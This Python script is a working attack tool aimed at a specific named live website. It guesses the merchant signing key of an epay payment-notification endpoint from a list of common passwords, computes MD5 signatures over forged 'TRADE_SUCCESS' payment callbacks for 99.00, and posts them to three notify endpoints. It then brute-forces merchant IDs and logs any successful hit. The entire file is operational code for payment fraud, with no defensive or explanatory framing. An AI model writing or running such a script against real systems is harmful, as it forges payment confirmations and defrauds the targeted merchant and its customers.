#!/usr/bin/env python3
"""qq1.lol epay notify signature forgery brute"""
import hashlib
import json
import os
import time
from datetime import datetime
from pathlib import Path

import requests

BASE = "https://qq1.lol"
OUT = Path(os.environ.get("QQ1_OUT", "/data/automation/results/qq1.lol"))
LOG = OUT / "epay_forge.log"
TRADE_NO = os.environ.get("QQ1_TRADE_NO", "20260720145603146")

KEYS = [
    "", "123456", "123456789", "admin", "key", "secret", "epay", "mckuai",
    "qq1", "buyi", "buyiq", "888888", "666666", "password", "faka", "rainbow",
    "syskey", "authkey", "qq1.lol", "qqkqq", "ka1", "ka1.one", "by123456",
    "jiankong", "cron", "monitor", "abcdef", "111111", "000000", "qwerty",
    "alipay", "wxpay", "qqpay", "paykey", "merchant", "apikey", "api_key",
]


def log(msg):
    line = f"[{datetime.now():%Y-%m-%d %H:%M:%S}] {msg}"
    print(line, flush=True)
    OUT.mkdir(parents=True, exist_ok=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def epay_sign(params, key):
    items = sorted((k, v) for k, v in params.items() if v and k not in ("sign", "sign_type"))
    s = "&".join(f"{k}={v}" for k, v in items) + key
    return hashlib.md5(s.encode()).hexdigest()


def try_notify(params, key, endpoint="other/epay_notify.php"):
    data = dict(params)
    data["sign"] = epay_sign(params, key)
    data["sign_type"] = "MD5"
    try:
        r = requests.post(f"{BASE}/{endpoint}", data=data, timeout=15)
        return r.text.strip()[:200]
    except Exception as e:
        return f"err:{e}"


def main():
    log(f"=== epay forge trade_no={TRADE_NO} ===")
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0"

    base_params = {
        "pid": "1",
        "trade_no": TRADE_NO,
        "out_trade_no": TRADE_NO,
        "type": "alipay",
        "name": "test",
        "money": "99.00",
        "trade_status": "TRADE_SUCCESS",
    }

    for key in KEYS:
        for ep in ["other/epay_notify.php", "other/alipay_notify.php", "other/qqpay_notify.php"]:
            resp = try_notify(base_params, key, ep)
            if resp and resp.lower() not in ("error", "fail", "", "sign error", "签名失败"):
                if "success" in resp.lower() or resp == "OK":
                    log(f"*** HIT key={key!r} ep={ep} -> {resp}")
                    return
                log(f"  unusual key={key!r} ep={ep} -> {resp}")
        time.sleep(0.5)

    # also try pid brute 1-100
    for pid in range(1, 50):
        p = dict(base_params)
        p["pid"] = str(pid)
        for key in ["", "123456", "admin"]:
            resp = try_notify(p, key)
            if "success" in resp.lower():
                log(f"*** HIT pid={pid} key={key!r} -> {resp}")
                return
    log("=== epay forge done, no hit ===")


if __name__ == "__main__":
    main()
